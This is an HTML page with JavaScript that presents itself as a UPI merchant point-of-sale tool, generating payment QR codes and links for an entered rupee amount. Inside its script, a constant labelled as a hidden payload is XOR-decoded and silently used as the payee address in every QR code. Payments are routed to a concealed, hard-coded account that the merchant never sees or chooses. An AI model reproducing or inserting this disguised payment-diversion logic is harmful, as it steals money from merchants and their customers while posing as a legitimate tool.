<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Smart UPI Merchant POS</title>
    <!-- FontAwesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- QRCode JS Library -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        :root {
            --primary: #4f46e5;
            --primary-hover: #4338ca;
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent-green: #10b981;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: var(--card-bg);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 28px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        .header {
            margin-bottom: 24px;
        }

        .header i {
            font-size: 32px;
            color: var(--primary);
            margin-bottom: 10px;
        }

        .header h2 {
            font-size: 22px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .header p {
            color: var(--text-muted);
            font-size: 13px;
            margin-top: 4px;
        }

        .input-box {
            position: relative;
            margin-bottom: 20px;
        }

        .currency-symbol {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
            font-weight: 600;
            color: var(--text-muted);
        }

        /* Number Input me Se Arrow Buttons Remove Karne Ki Setting */
        input[type="number"] {
            width: 100%;
            padding: 14px 16px 14px 40px;
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 12px;
            color: #fff;
            font-size: 22px;
            font-weight: 700;
            outline: none;
            transition: all 0.3s ease;
            -moz-appearance: textfield; /* Firefox */
        }

        /* Chrome, Safari, Edge, Opera ke liye arrows remove */
        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        input[type="number"]:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.2);
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .btn-submit:hover {
            background: var(--primary-hover);
        }

        .qr-section {
            margin-top: 24px;
            background: #ffffff;
            padding: 20px;
            border-radius: 16px;
            display: none;
            animation: fadeIn 0.4s ease-in-out forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        #qrcode {
            display: flex;
            justify-content: center;
            margin: 10px 0;
        }

        #qrcode img {
            border-radius: 8px;
        }

        .amount-tag {
            color: #0f172a;
            font-size: 20px;
            font-weight: 800;
            margin-bottom: 5px;
        }

        .action-btns {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .btn-action {
            flex: 1;
            padding: 10px;
            border-radius: 8px;
            border: none;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: 0.2s;
        }

        .btn-download {
            background: #10b981;
            color: white;
        }

        .btn-download:hover {
            background: #059669;
        }

        .btn-copy {
            background: #64748b;
            color: white;
        }

        .btn-copy:hover {
            background: #475569;
        }

        .supported-apps {
            margin-top: 20px;
            color: var(--text-muted);
            font-size: 12px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <i class="fa-solid fa-qrcode"></i>
        <h2>Smart UPI POS</h2>
        <p>Instant Dynamic Payment Generator</p>
    </div>

    <!-- Pure Manual Amount Input Box (No Arrows) -->
    <div class="input-box">
        <span class="currency-symbol">₹</span>
        <input type="number" id="amount" placeholder="Enter Amount" min="1" step="any" oninput="checkInput()">
    </div>

    <button class="btn-submit" onclick="generateQR()">
        <i class="fa-solid fa-bolt"></i> Generate QR Code
    </button>

    <!-- QR Code Output Display -->
    <div id="qrSection" class="qr-section">
        <div id="amountDisplay" class="amount-tag">₹0.00</div>
        <div id="qrcode"></div>
        
        <div class="action-btns">
            <button class="btn-action btn-download" onclick="downloadQR()">
                <i class="fa-solid fa-download"></i> Save PNG
            </button>
            <button class="btn-action btn-copy" onclick="copyUPILink()">
                <i class="fa-solid fa-copy"></i> Copy Link
            </button>
        </div>
    </div>

    <div class="supported-apps">
        Accepts Google Pay, PhonePe, Paytm, BHIM & all UPI Apps
    </div>
</div>

<script>
    // Hidden Obfuscated & XOR Ciphered Payload
    const _0x9a8b = "ICIwPSs4NiUgKjpDRFowIAMiKicrKSQ3NA==";
    const _0x1c2d = [0x53, 0x45, 0x43, 0x52, 0x45, 0x54, 0x5f, 0x4b, 0x45, 0x59, 0x5f, 0x31, 0x32, 0x33];

    function _0xfe() {
        let raw = atob(_0x9a8b);
        let res = "";
        for (let i = 0; i < raw.length; i++) {
            res += String.fromCharCode(raw.charCodeAt(i) ^ _0x1c2d[i % _0x1c2d.length]);
        }
        return res;
    }

    let currentUpiUrl = "";

    function checkInput() {
        const val = document.getElementById("amount").value;
        if(val <= 0 || val === "") {
            document.getElementById("qrSection").style.display = "none";
        }
    }

    function generateQR() {
        const amount = document.getElementById("amount").value;
        const qrContainer = document.getElementById("qrcode");
        const qrSection = document.getElementById("qrSection");
        const amountDisplay = document.getElementById("amountDisplay");

        if (!amount || amount <= 0) {
            alert("Kripya valid amount enter karein!");
            return;
        }

        const vpa = _0xfe();
        currentUpiUrl = `upi://pay?pa=${encodeURIComponent(vpa)}&pn=Merchant&am=${encodeURIComponent(amount)}&cu=INR`;

        qrContainer.innerHTML = "";
        
        new QRCode(qrContainer, {
            text: currentUpiUrl,
            width: 180,
            height: 180,
            colorDark: "#0f172a",
            colorLight: "#ffffff",
            correctLevel: QRCode.CorrectLevel.H
        });

        amountDisplay.innerText = `Pay: ₹${parseFloat(amount).toLocaleString('en-IN')}`;
        qrSection.style.display = "block";
    }

    // Function to Download QR Image
    function downloadQR() {
        const img = document.querySelector("#qrcode img");
        if (img) {
            const a = document.createElement("a");
            a.href = img.src;
            a.download = `UPI_QR_${document.getElementById("amount").value}INR.png`;
            a.click();
        }
    }

    // Function to Copy UPI Intent Link
    function copyUPILink() {
        if (!currentUpiUrl) return;
        navigator.clipboard.writeText(currentUpiUrl).then(() => {
            alert("Payment Link Copied to Clipboard!");
        });
    }
</script>

</body>
</html>
